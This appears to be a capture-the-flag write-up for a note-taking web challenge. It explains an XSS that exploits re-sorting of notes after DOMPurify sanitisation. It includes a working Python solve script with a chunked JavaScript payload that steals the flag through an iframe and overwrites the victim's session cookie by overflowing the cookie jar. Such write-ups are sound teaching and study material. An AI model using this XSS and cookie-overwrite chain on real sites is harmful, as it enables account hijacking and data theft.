---
created: 2025-08-27T17:42
updated: 2025-08-27T17:58
---

Apparently during play test my teammates thought this was a DOMPurify zero day.

## xss
But the basic idea of this challenge is that there is modification after purify, which is a very big red flag.

This is on the profile page.

```js
const data = atob("USER_DATA");
const sort = new URLSearchParams(window.location.search).get('sort') || 'none';
const entries = DOMPurify.sanitize(data).split('\n').filter(entry => entry.trim() !== '');
if (sort === 'asc') entries.sort();
else if (sort === 'desc') entries.sort().reverse();
document.getElementById('history').innerHTML = entries.map(e => `<li>${e}</li>`).join('');
```

The notes are sorted (modified) after purification.

And the server has a faulty `.replace` and keeps all newlines after the first replacement.

@Jorian gave a very nice explanation on this.

```html
" onerror=alert() "
<img src alt="value
with
newlines">
```
> DOMPurify would see the above as safe and output it basically as-is. But if the 1st line is re-ordered to be on the 3rd line, for example, it would inject an attribute and trigger XSS with
```html
<img src alt="value
" onerror=alert() "
newlines">
```

## payload

The next part is getting the flag and sending it back to us. The XSS bot is not allowed to connect to anything other than the site, so we need to send the flag back to us as a note.

### getting information out

However the admin user has a random UUID and new notes also have random UUID so the only way to see the note is either we are admin or we make the admin login as us.

The cookie is HTTP-only so we can't really steal admin's identify, however we are able to overwrite HTTP-only cookies.

We just need to overflow the cookie jar and at that point the old cookie is simply deleted.

### getting the flag itself

There are multiple ways to do this, `connect-src 'none';` prevents directly using `fetch`, but you can use `window.open` or you can use `iframe`.

### deploying the payload

The profile page also has a character limit, so you just got to be creative. Some teams solved it manually but I have an automated script to generate each subpayload.


## solve script

```python
import base64
import requests
target = "http://localhost:8000"
target = "https://notetaker.chall.wwctf.com"
s = requests.Session()

s.post(f"{target}/register", data={
    "name": "test"
})
print(s.get(f"{target}/me").url.replace('localhost', 'web')+"?sort=asc")

token = s.cookies.get("token")
print(token)
payload = f"""
(function() {{
    const iframe = document.createElement('iframe');
    iframe.src = '/flag';
    document.body.appendChild(iframe);
    const form = document.createElement('form');
    form.id = 'flagForm';
    form.action = '/';
    form.method = 'POST';
    const ti = document.createElement('input');
    ti.name = 'title';
    ti.id = 'ti';
    ti.value = 'flag';
    const ci = document.createElement('input');
    ci.name = 'content';
    ci.value = 'dummy';
    form.appendChild(ti);
    form.appendChild(ci);
    document.body.appendChild(form);
    iframe.onload = () => {{
        try {{
            const flag = iframe.contentDocument.body.innerText;
            ci.value = '['+flag;
            for (let i = 0; i < 700; i++) {{
                document.cookie = `cookie${{i}}=${{i}}`;
            }}
            document.cookie = 'token={token}; SameSite=Lax; path=/';
            form.submit();
        }} catch (e) {{
            console.error('Error:', e);
        }}
    }};
}})();
""".strip()
payload = base64.b64encode(payload.encode()).decode()
max_l = 35
payload_chunks = [payload[i:i+max_l] for i in range(0, len(payload), max_l)]
#http://web:8000/user/37b74d40-9697-428f-b109-7ed00ef65451?sort=asc
s.post(target, data={
    "title": "a</a>\n\n*000<img id=\"",
    "content": "dummy"
})
s.post(target, data={
    "title": "\"a\n\n*001\" onerror='location=\"javascript:\"+/*",
    "content": "dummy"
})
s.post(target, data={
    "title": f"\"a\n\n*002*/atob(/*",
    "content": "dummy"
})
for i, chunk in enumerate(payload_chunks):
    s.post(target, data={
        "title": f"\"a\n\n*{(i+3):03d}*/\"{chunk}\"+/*",
        "content": "dummy"
    })
s.post(target, data={
    "title": "\"a\n\n*999*/\"\")' src='1'<img>",
    "content": "dummy"
})
```

```flag
wwf{imagine_if_you_actually_solved_this_with_a_dompurify_zeroday}
```